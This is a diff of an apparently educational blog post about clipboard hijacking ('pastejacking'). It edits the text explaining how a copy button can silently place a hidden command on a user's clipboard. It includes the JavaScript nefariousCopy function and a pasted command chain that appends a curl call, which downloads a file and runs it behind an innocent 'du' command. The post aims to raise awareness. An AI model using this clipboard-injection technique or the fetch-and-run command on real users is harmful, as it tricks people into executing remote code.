@@ -104,7 +104,7 @@ The copy button called a javascript function.
 <button class="button" onclick="nefariousCopy()"><span>📋</span></button>
 ```
 
-The function when called creates a dummy text element and selects it. Using the `execCommand()` the dummy text is copied to the clipboard and the user is one the wiser.
+The nefariousCopy function creates a dummy text element and selects its' contents. Using [`execCommand(copy)`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Interact_with_the_clipboard) the dummy text is copied to the clipboard and the user is none the wiser.
 ```
 function nefariousCopy(n) {
   var dummy = document.createElement("textarea");
@@ -116,20 +116,18 @@ function nefariousCopy(n) {
 }
 ```
 
-
-
-What is copied to your clipboard:
+This is what is copied to the clipboard when the copy button is clicked:
 ```
 curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n
 ```
 
-Using `select()` plus `execCommand()` is the way most copy buttons on webpage work, just instead of adding a dummy element and text behind seen They select and copy the text from elements seen by the user, but the user is at the mercy of the copy function. 
+Using `select()` plus `execCommand()` is the way most copy buttons on webpage work, just instead of adding a dummy element and text behind seen They select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.
 
 ## Normal Select, Copy & Paste
 
-One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets.
+One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets. Simply selecting text, using right click or `ctrl + c` and then pasting should be safe right? 
 
-Now lets go back to Look at another post from  totally-safe-and-helpful.blog ...
+Lets go back to Look at another post from  totally-safe-and-helpful.blog ...
 
 <div id="totallysafeandhelpful">
 
@@ -195,8 +193,11 @@ du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-y
 du -hs * | sort -rh | head -5
 ```
 
+The curl downloads a file, makes it exactable, runs it. 
+
 ## Composing the Attack
 
+Now the real danger is in the sudo command.
 
 
 ### Social Engineering
